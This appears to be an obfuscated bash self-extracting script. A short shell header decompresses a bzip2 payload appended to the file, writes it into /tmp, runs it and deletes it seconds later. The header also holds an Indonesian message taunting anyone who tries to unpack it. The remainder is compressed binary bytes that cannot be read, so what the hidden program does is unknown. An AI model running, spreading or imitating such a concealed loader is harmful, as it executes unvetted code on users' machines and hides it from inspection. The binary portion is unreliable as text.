#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�"�; 1�o�����������`���P  @ �
�BI�@   8 ��2  � �@   � @ �  @ i�   @ � h� � 4�   �D��=4�3S���D�3I�`�C�i�  CM � h� � 4�   �I C@L�124�D���='�ƓCi3M'��Lj~�4 j7ǵ&(X-�W�QM�MQ�Q��1�C���=}�h(O������r�ޗ҈ʯW�S�')^����OfT��5�q�(��:iD�t	J��� ��jX��L�������"=��+Q��wf=0�$�3A�
��
���� {#ə��q��3"���Poc��fg�3�d�/8�h�y�Jϖ1Tn>�?���E��TA���2�p�C�)Ĕ?��f��Y8�I��Q��FV"l%��dPp*��)����"����ə�ɇ1���0�!����4���:�`����+&�����r�WXq�y�����e���z�DV@me]�X΋��R^^��[yG�&��*�K �U��O�4�H����
�yxP�V��8f}�W��+�I_����ܟ���C���I��{��3����8�<m�ڊC|�qt��D%�;G����o�����B�2I�G�tbxfF-&1�K�z�e��Jȳ� �I�BUid�
P�"R)RJ�YJ4]���k�cx����H�p�rC`C
�A��� \��s����-��ʮ2�&���ef�׿������	���O��-�I�*�1����.K��`bc���a"W��Z"֦�q-�����5�JU�� \s1�p<�8�(��i�Kz",���ɐ�R'H�+K�
���p+����v��
5+�`�� 0���K���ԏ�r����i�(��\x���V�q���_q�g������Ɠ
ԉDs7a�B�0�;�;]k,�TE���-51 �I�B�⒧8� 6-�^��.�rz�)�a��ճ�׻��.N�y"Os��7t��DL+�8cONi������n��=�x<c�0��(H�� g#" ��)�|�����D!�I�@��r�6	�f��o7�NlD��� DpJ��0�&�u(�-L�GQ9���L"c�_�2��¤�7�=�
�!����&c>�6��Ec^@������ʘ�D��R0��R���.91	��	�5��B�2�f$�1��`o�$Zbd�ÇV��%����hP����h�	�(�Ԍ�9`�@�4��@k�X��9�`��M��|��x�w� ����ݖ2@�����2�fR
;'#C�1�ԟ�k�%D�����lL�`��4K��6	)�ߔ��*	uP���م�=�� �3����n䳃}t�dؠ�K9�,�%��r��%�p5 R����)�~��~T�^�y��/x��09���Gj�$Y�,ˀyz���#����z��������D���v�{D|Yנx�rw1Zͦ�`SA��Y��2��z�WQ- \�*3�a�d��chMBq��P\"CH:XqA1%Ȗ����׳*Fҡ�~��q�==V<+U��UD�e[�R;#Ɂ�8��J?�7�,��r�MOа�,� ��t��7������Dˁ�: a+�Μ���LD��H����^�a�b�ǡ���?�q�3>H'>p
E�Z�^<�|�ɀ���Kh�@���M�3V9bn�q��:��fq���l\�t��o�W�6}O{:�i1�a�J���oxo�Q�?�Ц;	fq��qq�x�S0`-�9t�bE��!�f���6 �֧V�x~}�G|J���ֿ9M����C�޴���ă �
R��C4��;i�C�T���!@p���T� ���"	Ţ�@ZrOA���h"A0VO�SK*Pw�v�$����\�ۘ��Yz9G9	�s��$��x�3��4��J���݀Nr�ժ�	ylu]�j(W��`��1��h�p0�0�8'0��Qh"H$�"s������J��L���+H0��̖��E_�=�I&2z�c�pOa�=�	�׻��b`J�tҽ��(� ���&� ��'ĊqB"P#�sR�a�F4��c+ć��m���L��^�1:<F	�<��*��V�I�P8�Ql�)���^%�ApPZ���Z8qϣsk =LPp��>�Ymbj�b'hVe�E'�j��L"��N=R|�
�s�.D�p�'�]��w�a�c��--
G�x�}�8g{��$�� $�1�1��|�8�8
� ��� �c XN�.�p�!E�v